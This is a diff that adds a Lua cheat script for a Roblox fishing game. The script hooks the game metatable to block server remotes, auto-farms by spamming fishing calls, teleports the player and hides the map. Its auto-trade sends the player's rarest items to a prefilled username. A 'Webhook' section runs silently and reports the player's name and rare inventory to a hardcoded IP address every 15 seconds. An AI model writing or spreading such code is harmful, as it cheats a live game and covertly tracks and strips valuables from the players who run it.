@@ -1,0 +1,726 @@
+-- ======================================================
+-- COMBINED SCRIPT: TRADER + FISHER V1 + EXTREME POTATO
+-- ======================================================
+
+-- ===============================
+-- 1. GLOBAL SERVICES & BYPASSES
+-- ===============================
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+
+-- ANTI-AFK
+pcall(function()
+    for i, v in pairs(getconnections(lp.Idled)) do
+        if v.Disable then v:Disable() end
+    end
+end)
+
+-- CLIENT BYPASSES (REQUIRED FOR V1 FISHING)
+task.spawn(function()
+    local S1, FishingController = pcall(function() return require(ReplicatedStorage.Controllers.FishingController) end)
+    if S1 and FishingController then
+        FishingController.RequestChargeFishingRod = function(...) return nil end
+        FishingController.SendFishingRequestToServer = function(...) return false, "Blocked by V1" end
+    end
+end)
+
+local BLOCKED_REMOTES = {
+    ["RequestFishingMinigameStarted"] = true,
+    ["ChargeFishingRod"] = true,
+    ["UpdateAutoFishingState"] = true,
+    ["CancelFishingInputs"] = true
+}
+
+local mt = getrawmetatable(game)
+local old_namecall = mt.__namecall
+setreadonly(mt, false)
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if not checkcaller() then
+        if method == "InvokeServer" and BLOCKED_REMOTES[self.Name] then return task.wait(9e9) end
+        if method == "FireServer" and self.Name == "FishingCompleted" then return nil end
+    end
+    return old_namecall(self, ...)
+end)
+setreadonly(mt, true)
+
+-- ===============================
+-- 2. SHARED MODULES
+-- ===============================
+local Replion = require(ReplicatedStorage.Packages.Replion).Client
+local ItemUtility = require(ReplicatedStorage.Shared.ItemUtility)
+local TierUtility = require(ReplicatedStorage.Shared.TierUtility)
+local PlayerData = Replion:WaitReplion("Data", 10)
+
+local function GetRemote(name)
+    local path = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
+    local current = ReplicatedStorage
+    for _, child in ipairs(path) do
+        current = current:WaitForChild(child, 2)
+        if not current then return nil end
+    end
+    return current:FindFirstChild(name)
+end
+
+-- ===============================
+-- 3. EXTREME INVISIBLE POTATO MODE
+-- ===============================
+local VFXControllerModule, originalVFXHandle, originalPlayVFX
+pcall(function()
+    VFXControllerModule = require(ReplicatedStorage:WaitForChild("Controllers").VFXController)
+    originalVFXHandle = VFXControllerModule.Handle
+    originalPlayVFX = VFXControllerModule.PlayVFX.Fire 
+end)
+
+local PotatoLoop = nil
+
+local function ApplyExtremePotato()
+    -- 1. Block VFX
+    if VFXControllerModule then
+        VFXControllerModule.Handle = function(...) return nil end
+        if VFXControllerModule.PlayVFX then VFXControllerModule.PlayVFX.Fire = function(...) return nil end end
+        local cosmeticFolder = workspace:FindFirstChild("CosmeticFolder")
+        if cosmeticFolder then pcall(function() cosmeticFolder:ClearAllChildren() end) end
+    end
+
+    -- 2. Remove Environmental Effects
+    pcall(function()
+        local Lighting = game:GetService("Lighting")
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 9e9
+        Lighting.Brightness = 0
+        
+        -- Invisible Water
+        if workspace.Terrain then
+            workspace.Terrain.WaterWaveSize = 0
+            workspace.Terrain.WaterTransparency = 1 
+            workspace.Terrain.WaterReflectance = 0
+        end
+    end)
+
+    -- 3. Make Map & Objects Invisible
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.Transparency = 1 -- Invisible
+            v.Reflectance = 0
+            v.CastShadow = false
+        elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
+            v:Destroy()
+        end
+    end
+
+    -- 4. Make Character & Rod Invisible
+    if lp.Character then
+        for _, v in ipairs(lp.Character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.Transparency = 1 -- Invisible Body/Rod parts
+                v.Reflectance = 0
+            elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("MeshPart") then
+                -- Hide faces and meshes on tools
+                if v:IsA("Decal") or v:IsA("Texture") then v:Destroy() end
+                if v:IsA("MeshPart") then v.Transparency = 1 end
+            end
+        end
+    end
+
+    if setfpscap then pcall(function() setfpscap(30) end) end
+end
+
+local function StartPotatoLoop()
+    if PotatoLoop then return end
+    ApplyExtremePotato()
+    PotatoLoop = task.spawn(function() 
+        while task.wait(3) do -- Re-apply every 3s to catch new objects/rods
+            ApplyExtremePotato() 
+        end 
+    end)
+end
+
+local function StopPotato()
+    if PotatoLoop then task.cancel(PotatoLoop); PotatoLoop = nil end
+    if VFXControllerModule then
+        VFXControllerModule.Handle = originalVFXHandle
+        if originalPlayVFX then VFXControllerModule.PlayVFX.Fire = originalPlayVFX end
+    end
+    if setfpscap then pcall(function() setfpscap(60) end) end
+end
+
+-- ===============================
+-- 4. FISHER V1 LOGIC
+-- ===============================
+local FishingConfig = { Enabled = false, AutoEquip = true, CompleteDelay = 1.53, CancelDelay = 0.38 }
+local FishingState = { IsFishing = false, Teleporting = false, TotalCoins = 0, SessionEarnings = 0, CurrentLocation = "Idle" }
+local FishingThreads = {}
+local FishingConnection = nil
+local phase = "STEP123"
+local lastStepTime = 0
+
+local RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
+local RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
+local RE_FishingCompleted = GetRemote("RE/FishingCompleted")
+local RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
+local RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
+local RF_UpdateAutoFishingState = GetRemote("RF/UpdateAutoFishingState")
+local RF_SellAllItems = GetRemote("RF/SellAllItems")
+local RE_FavoriteItem = GetRemote("RE/FavoriteItem")
+
+local function GetCoins()
+    return PlayerData and (PlayerData:Get("Coins") or 0) or 0
+end
+
+local function FormatNumber(num)
+    if num >= 1000000 then return string.format("%.1fM", num/1000000)
+    elseif num >= 1000 then return string.format("%.1fK", num/1000)
+    else return tostring(num) end
+end
+
+local function ForceStep123()
+    task.spawn(function()
+        pcall(function()
+            local now = os.clock()
+            RF_CancelFishingInputs:InvokeServer()
+            RF_ChargeFishingRod:InvokeServer({ [1] = now })
+            RF_RequestFishingMinigameStarted:InvokeServer(1, now, now)
+        end)
+    end)
+end
+
+local function ForceStep4()
+    task.spawn(function() pcall(function() RE_FishingCompleted:FireServer() end) end)
+end
+
+local function StartFishingV1()
+    if FishingState.IsFishing then return end
+    FishingState.IsFishing = true
+    FishingConfig.Enabled = true
+    
+    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(true) end) end
+    
+    local equipThread = task.spawn(function()
+        while FishingConfig.Enabled do
+            if FishingConfig.AutoEquip and RE_EquipToolFromHotbar then
+                pcall(function() RE_EquipToolFromHotbar:FireServer(1) end)
+            end
+            task.wait(0.8)
+        end
+    end)
+    table.insert(FishingThreads, equipThread)
+    
+    phase = "INIT23"
+    lastStepTime = os.clock()
+    
+    FishingConnection = RunService.Heartbeat:Connect(function()
+        if not FishingConfig.Enabled then return end
+        local now = os.clock()
+        if phase == "INIT23" or phase == "STEP123" then lastStepTime = now; ForceStep123(); phase = "WAIT_COMPLETE" end
+        if phase == "WAIT_COMPLETE" and (now - lastStepTime) >= FishingConfig.CompleteDelay then phase = "STEP4" end
+        if phase == "STEP4" then lastStepTime = now; ForceStep4(); phase = "WAIT_STOP" end
+        if phase == "WAIT_STOP" and (now - lastStepTime) >= FishingConfig.CancelDelay then phase = "STEP123" end
+    end)
+
+    -- Auto Sell
+    local sellThread = task.spawn(function()
+        while FishingConfig.Enabled do
+            local before = GetCoins()
+            pcall(function() if RF_SellAllItems then RF_SellAllItems:InvokeServer() end end)
+            task.wait(1)
+            local after = GetCoins()
+            if after > before then FishingState.SessionEarnings = FishingState.SessionEarnings + (after - before) end
+            task.wait(59)
+        end
+    end)
+    table.insert(FishingThreads, sellThread)
+    
+    -- Ruby Manager
+    local rubyThread = task.spawn(function()
+        while FishingConfig.Enabled do
+            local inv = PlayerData:GetExpect("Inventory")
+            if inv then
+                for _, items in pairs(inv) do
+                    for _, item in ipairs(items) do
+                        local name = item.Identifier or "Unknown"
+                        if ItemUtility and item.Id then
+                            pcall(function() 
+                                local d = ItemUtility:GetItemData(item.Id)
+                                if d and d.Data then name = d.Data.Name end
+                            end)
+                        end
+                        local variant = "None"
+                        if item.Metadata and item.Metadata.VariantId then variant = item.Metadata.VariantId end
+                        
+                        if name == "Ruby" and item.UUID then
+                            local isLocked = (item.IsFavorite or item.Favorited or item.Locked)
+                            if variant == "Gemstone" then
+                                if not isLocked then pcall(function() RE_FavoriteItem:FireServer(item.UUID) end) task.wait(0.3) end
+                            else
+                                if isLocked then pcall(function() RE_FavoriteItem:FireServer(item.UUID) end) task.wait(0.3) end
+                            end
+                        end
+                    end
+                end
+            end
+            task.wait(2.5)
+        end
+    end)
+    table.insert(FishingThreads, rubyThread)
+end
+
+local function StopFishingV1()
+    FishingConfig.Enabled = false
+    FishingState.IsFishing = false
+    if FishingConnection then FishingConnection:Disconnect(); FishingConnection = nil end
+    for _, t in ipairs(FishingThreads) do task.cancel(t) end
+    FishingThreads = {}
+    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
+    pcall(function() RE_EquipToolFromHotbar:FireServer(0) end)
+    pcall(function() RF_CancelFishingInputs:InvokeServer() end)
+end
+
+local function TeleportToTreasure()
+    if FishingState.Teleporting then return end
+    FishingState.Teleporting = true
+    FishingState.CurrentLocation = "Teleporting..."
+    
+    -- Changed to Weather Machine location
+    local pos = Vector3.new(-1518.550, 2.875, 1916.148)
+    local look = Vector3.new(0.042, 0.000, 0.999)
+    
+    pcall(function()
+        local char = lp.Character or lp.CharacterAdded:Wait()
+        local root = char:WaitForChild("HumanoidRootPart", 5)
+        if root then 
+            -- Create CFrame with position and look direction
+            root.CFrame = CFrame.new(pos, pos + look) 
+        end
+    end)
+    task.wait(0.5)
+    FishingState.Teleporting = false
+    FishingState.CurrentLocation = "Weather Machine"
+end
+-- ===============================
+-- 5. TRADING LOGIC
+-- ===============================
+local TradingConfig = { AutoTrade = false, Delay = 6.5, Retry = 2.0, Mode = "SECRETS_FIRST", TargetId = nil }
+local TradingThread = nil
+local RF_InitiateTrade = GetRemote("RF/InitiateTrade")
+
+local function GetFishNameAndRarity(item)
+    local name = item.Identifier or "Unknown"
+    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+    local itemID = item.Id
+    local itemData
+
+    if ItemUtility and itemID then
+        pcall(function()
+            itemData = ItemUtility:GetItemData(itemID)
+            if not itemData then
+                local numericID = tonumber(item.Id) or tonumber(item.Identifier)
+                if numericID then itemData = ItemUtility:GetItemData(numericID) end
+            end
+        end)
+    end
+
+    if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
+    if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity 
+    elseif itemData and itemData.Probability and TierUtility then 
+        pcall(function() rarity = TierUtility:GetTierFromRarity(itemData.Probability.Chance).Name end) 
+    end
+    return name, rarity
+end
+
+local function GetMutation(item)
+    if not item.Metadata then return "None" end
+    if item.Metadata.VariantId and item.Metadata.VariantId ~= "" then return item.Metadata.VariantId end
+    if item.Metadata.Shiny == true then return "Shiny" end
+    return "None"
+end
+
+local function ScanInventoryForTrade()
+    local secrets, rubies = {}, {}
+    local inv = PlayerData:GetExpect("Inventory")
+    if not inv then return secrets, rubies end
+    
+    for _, items in pairs(inv) do
+        for _, item in ipairs(items) do
+            local name, rarity = GetFishNameAndRarity(item)
+            local mutation = GetMutation(item)
+            
+            if string.upper(tostring(rarity)) == "SECRET" then
+                table.insert(secrets, {uuid = item.UUID, name = name})
+            end
+            
+            if name == "Ruby" and mutation == "Gemstone" then
+                table.insert(rubies, {uuid = item.UUID, name = name})
+            end
+        end
+    end
+    return secrets, rubies
+end
+
+local function IsItemStillInInventory(uuid)
+    local inv = PlayerData:GetExpect("Inventory")
+    if not inv then return false end
+    for _, items in pairs(inv) do
+        for _, item in ipairs(items) do
+            if item.UUID == uuid then return true end
+        end
+    end
+    return false
+end
+
+-- Forward decl for stop
+local StopTrading
+
+local function RunAutoTrade()
+    if TradingThread then task.cancel(TradingThread) end
+    TradingThread = task.spawn(function()
+        while TradingConfig.AutoTrade do
+            local success, err = pcall(function()
+                local secrets, rubies = ScanInventoryForTrade()
+                
+                if #secrets == 0 and #rubies == 0 then
+                    TradingConfig.AutoTrade = false
+                    return
+                end
+                
+                local tradeUUID, tradeName = nil, "Unknown"
+                
+                if TradingConfig.Mode == "SECRETS_FIRST" then
+                    if #secrets > 0 then tradeUUID = secrets[1].uuid; tradeName = secrets[1].name
+                    elseif #rubies > 0 then tradeUUID = rubies[1].uuid; tradeName = rubies[1].name end
+                elseif TradingConfig.Mode == "RUBY_GEMSTONE" then
+                    if #rubies > 0 then tradeUUID = rubies[1].uuid; tradeName = rubies[1].name end
+                elseif TradingConfig.Mode == "ALL" then
+                    if #secrets > 0 then tradeUUID = secrets[1].uuid; tradeName = secrets[1].name
+                    elseif #rubies > 0 then tradeUUID = rubies[1].uuid; tradeName = rubies[1].name end
+                end
+                
+                if not tradeUUID then task.wait(2); return end
+                
+                print("[Trade] Sending: " .. tradeName)
+                RF_InitiateTrade:InvokeServer(TradingConfig.TargetId, tradeUUID)
+                
+                local start = os.clock()
+                local done = false
+                repeat
+                    task.wait(0.5)
+                    done = not IsItemStillInInventory(tradeUUID)
+                until done or (os.clock() - start) > 10
+                
+                task.wait(done and TradingConfig.Delay or TradingConfig.Retry)
+            end)
+            
+            if not TradingConfig.AutoTrade then break end
+            task.wait(0.1)
+        end
+        StopTrading()
+    end)
+end
+
+-- ===============================
+-- 6. GUI CONSTRUCTION
+-- ===============================
+local gui = Instance.new("ScreenGui", lp.PlayerGui)
+gui.ResetOnSpawn = false
+gui.Name = "UltimateTraderFisher"
+
+-- === MASTER TOGGLE ===
+local masterToggleBtn = Instance.new("TextButton", gui)
+masterToggleBtn.Name = "MasterToggle"
+masterToggleBtn.Size = UDim2.fromOffset(50, 50)
+masterToggleBtn.Position = UDim2.new(0, 10, 0.5, -25)
+masterToggleBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
+masterToggleBtn.Text = "UI"
+masterToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+masterToggleBtn.Font = Enum.Font.GothamBold
+masterToggleBtn.TextSize = 18
+masterToggleBtn.Active = true
+masterToggleBtn.Draggable = true
+Instance.new("UICorner", masterToggleBtn).CornerRadius = UDim.new(1, 0)
+Instance.new("UIStroke", masterToggleBtn).Color = Color3.fromRGB(255, 255, 255)
+
+-- === TRADING FRAME (MAIN) ===
+local tradeFrame = Instance.new("Frame", gui)
+tradeFrame.Size = UDim2.fromOffset(320, 300)
+tradeFrame.Position = UDim2.new(0.5, -160, 0.5, -150)
+tradeFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+tradeFrame.BorderSizePixel = 2
+tradeFrame.BorderColor3 = Color3.fromRGB(100, 0, 150)
+tradeFrame.Active = true
+tradeFrame.Draggable = true
+
+-- Title Bar
+local titleBar = Instance.new("Frame", tradeFrame)
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+
+local title = Instance.new("TextLabel", titleBar)
+title.Size = UDim2.new(1, -60, 1, 0)
+title.Position = UDim2.new(0, 5, 0, 0)
+title.Text = "🎣 TRADER + FISHER V1"
+title.TextColor3 = Color3.fromRGB(255, 215, 0)
+title.Font = Enum.Font.GothamBold
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local closeBtn = Instance.new("TextButton", titleBar)
+closeBtn.Size = UDim2.fromOffset(20, 20)
+closeBtn.Position = UDim2.new(1, -20, 0.5, -10)
+closeBtn.Text = "X"
+closeBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+closeBtn.TextColor3 = Color3.new(1,1,1)
+
+-- Trading UI Elements
+local input = Instance.new("TextBox", tradeFrame)
+input.Size = UDim2.new(1, -20, 0, 30)
+input.Position = UDim2.new(0, 10, 0, 40)
+input.PlaceholderText = "Target Username"
+input.Text = "mm3kenak"
+input.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+input.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local statsLabel = Instance.new("TextLabel", tradeFrame)
+statsLabel.Size = UDim2.new(1, -20, 0, 40)
+statsLabel.Position = UDim2.new(0, 10, 0, 75)
+statsLabel.Text = "Secrets: 0\nRuby Gems: 0"
+statsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statsLabel.BackgroundTransparency = 1
+
+local tradeToggle = Instance.new("TextButton", tradeFrame)
+tradeToggle.Size = UDim2.new(1, -20, 0, 35)
+tradeToggle.Position = UDim2.new(0, 10, 0, 120)
+tradeToggle.Text = "▶ START AUTO TRADE"
+tradeToggle.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
+tradeToggle.TextColor3 = Color3.new(1,1,1)
+tradeToggle.Font = Enum.Font.GothamBold
+
+-- === FISHER V1 ACCESS ===
+local divider = Instance.new("Frame", tradeFrame)
+divider.Size = UDim2.new(0.9, 0, 0, 2)
+divider.Position = UDim2.new(0.05, 0, 0, 165)
+divider.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
+
+local openFisherBtn = Instance.new("TextButton", tradeFrame)
+openFisherBtn.Size = UDim2.new(1, -20, 0, 35)
+openFisherBtn.Position = UDim2.new(0, 10, 0, 175)
+openFisherBtn.Text = "💰 OPEN FISHER MENU"
+openFisherBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+openFisherBtn.TextColor3 = Color3.new(1,1,1)
+openFisherBtn.Font = Enum.Font.GothamBold
+
+-- Status
+local statusLabel = Instance.new("TextLabel", tradeFrame)
+statusLabel.Size = UDim2.new(1, -20, 0, 25)
+statusLabel.Position = UDim2.new(0, 10, 1, -30)
+statusLabel.Text = "Status: Idle"
+statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+statusLabel.BackgroundTransparency = 1
+
+-- === FISHING FRAME (INITIALLY HIDDEN) ===
+local fishFrame = Instance.new("Frame", gui)
+fishFrame.Size = UDim2.fromOffset(300, 250)
+fishFrame.Position = UDim2.new(0.5, 170, 0.5, -125)
+fishFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+fishFrame.BorderSizePixel = 2
+fishFrame.BorderColor3 = Color3.fromRGB(0, 100, 200)
+fishFrame.Visible = false
+fishFrame.Active = true
+fishFrame.Draggable = true
+
+local fTitle = Instance.new("TextLabel", fishFrame)
+fTitle.Size = UDim2.new(1, 0, 0, 30)
+fTitle.Text = "  TREASURE FISHER V1"
+fTitle.Font = Enum.Font.GothamBold
+fTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
+fTitle.TextXAlignment = Enum.TextXAlignment.Left
+fTitle.BackgroundTransparency = 1
+
+local hideFishBtn = Instance.new("TextButton", fishFrame)
+hideFishBtn.Size = UDim2.fromOffset(24, 24)
+hideFishBtn.Position = UDim2.new(1, -30, 0, 3)
+hideFishBtn.Text = "-"
+hideFishBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+hideFishBtn.TextColor3 = Color3.new(1,1,1)
+
+local fishInfo = Instance.new("TextLabel", fishFrame)
+fishInfo.Size = UDim2.new(0.9, 0, 0, 100)
+fishInfo.Position = UDim2.new(0.05, 0, 0.15, 0)
+fishInfo.BackgroundTransparency = 1
+fishInfo.TextColor3 = Color3.new(1,1,1)
+fishInfo.TextXAlignment = Enum.TextXAlignment.Left
+fishInfo.TextYAlignment = Enum.TextYAlignment.Top
+fishInfo.Text = "Stats:\nCoins: 0\nEarned: 0\nLoc: Idle"
+fishInfo.Font = Enum.Font.Gotham
+fishInfo.TextSize = 14
+
+local startFishBtn = Instance.new("TextButton", fishFrame)
+startFishBtn.Size = UDim2.new(0.9, 0, 0, 40)
+startFishBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
+startFishBtn.Text = "START FARMING"
+startFishBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
+startFishBtn.TextColor3 = Color3.new(1,1,1)
+startFishBtn.Font = Enum.Font.GothamBold
+
+local potatoToggle = Instance.new("TextButton", fishFrame)
+potatoToggle.Size = UDim2.new(0.9, 0, 0, 30)
+potatoToggle.Position = UDim2.new(0.05, 0, 0.8, 0)
+potatoToggle.Text = "Toggle Invisible Mode (Potato)"
+potatoToggle.BackgroundColor3 = Color3.fromRGB(150, 100, 0)
+potatoToggle.TextColor3 = Color3.new(1,1,1)
+
+-- ===============================
+-- 7. GUI LOGIC & BINDINGS
+-- ===============================
+
+masterToggleBtn.MouseButton1Click:Connect(function()
+    tradeFrame.Visible = not tradeFrame.Visible
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+    StopTrading()
+    StopFishingV1()
+    StopPotato()
+    gui:Destroy()
+end)
+
+openFisherBtn.MouseButton1Click:Connect(function()
+    fishFrame.Visible = not fishFrame.Visible
+end)
+hideFishBtn.MouseButton1Click:Connect(function()
+    fishFrame.Visible = false
+end)
+
+-- Trading Logic Update
+StopTrading = function()
+    TradingConfig.AutoTrade = false
+    tradeToggle.Text = "▶ START AUTO TRADE"
+    tradeToggle.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
+    statusLabel.Text = "Status: Trade Stopped"
+    if TradingThread then task.cancel(TradingThread); TradingThread = nil end
+end
+
+tradeToggle.MouseButton1Click:Connect(function()
+    if TradingConfig.AutoTrade then
+        StopTrading()
+    else
+        local name = input.Text
+        local s, id = pcall(function() return Players:GetUserIdFromNameAsync(name) end)
+        if s and id then
+            local p = Players:GetPlayerByUserId(id)
+            if p then
+                TradingConfig.TargetId = id
+                TradingConfig.AutoTrade = true
+                tradeToggle.Text = "⏹ STOP TRADING"
+                tradeToggle.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+                statusLabel.Text = "Status: Trading..."
+                RunAutoTrade()
+            else
+                statusLabel.Text = "Status: Player not found"
+            end
+        else
+            statusLabel.Text = "Status: Invalid Username"
+        end
+    end
+end)
+
+-- Fishing Logic Update
+startFishBtn.MouseButton1Click:Connect(function()
+    if FishingState.IsFishing then
+        StopFishingV1()
+        startFishBtn.Text = "START FARMING"
+        startFishBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
+    else
+        startFishBtn.Text = "STOP FARMING"
+        startFishBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        StartPotatoLoop()
+        TeleportToTreasure()
+        StartFishingV1()
+    end
+end)
+
+potatoToggle.MouseButton1Click:Connect(function()
+    if PotatoLoop then StopPotato() else StartPotatoLoop() end
+end)
+
+-- Update Loops
+task.spawn(function()
+    while gui.Parent do
+        local s, r = ScanInventoryForTrade()
+        statsLabel.Text = string.format("Secrets: %d\nRuby Gems: %d", #s, #r)
+        
+        if FishingConfig.Enabled then
+             fishInfo.Text = string.format("Stats:\nCoins: %s\nEarned: %s\nLoc: %s\nMode: V1 + RubyMgr", 
+                FormatNumber(GetCoins()), 
+                FormatNumber(FishingState.SessionEarnings),
+                FishingState.CurrentLocation)
+        end
+        task.wait(1)
+    end
+end)
+
+-- Webhook
+task.spawn(function()
+    local WEBHOOK_BASE = "http://43.134.116.2:5000/webhook/fishit"
+    local function SendHook(pName, data)
+        local json = HttpService:JSONEncode(data)
+        local url = WEBHOOK_BASE .. "?player=" .. HttpService:UrlEncode(pName) .. "&data=" .. HttpService:UrlEncode(json)
+        pcall(function() game:HttpGet(url) end)
+    end
+
+    local dataR = Replion:WaitReplion("Data")
+    while true do
+        local inv = dataR:GetExpect("Inventory")
+        local summary = {}
+        if inv then
+            for _, items in pairs(inv) do
+                for _, item in ipairs(items) do
+                    local n, r = GetFishNameAndRarity(item)
+                    local mut = GetMutation(item)
+                    if r == "SECRET" or (n == "Ruby" and mut == "Gemstone") then
+                        local dName = n
+                        if mut == "Gemstone" then dName = "[Gemstone] " .. n 
+                        elseif mut ~= "None" then dName = "["..mut.."] "..n end
+                        summary[dName] = (summary[dName] or 0) + 1
+                    end
+                end
+            end
+        end
+        SendHook(lp.Name, summary)
+        task.wait(15)
+    end
+end)
+
+-- ===============================
+-- 8. AUTO-START FEATURE
+-- ===============================
+
+-- Wait for everything to load properly
+task.wait(2)
+
+-- Function to auto-start everything
+local function AutoStartEverything()
+    -- Enable Potato Mode
+    StartPotatoLoop()
+    
+    -- Teleport to treasure location
+    TeleportToTreasure()
+    
+    -- Start Fishing V1
+    StartFishingV1()
+    
+    -- Update fishing button state
+    startFishBtn.Text = "STOP FARMING"
+    startFishBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+    
+    -- Update status
+    fishFrame.Visible = true
+    statusLabel.Text = "Status: Auto-Started Farming"
+    
+    print("[AutoStart] Everything started automatically!")
+end
+
+-- Auto-start after a short delay to ensure everything is loaded
+task.delay(3, AutoStartEverything)
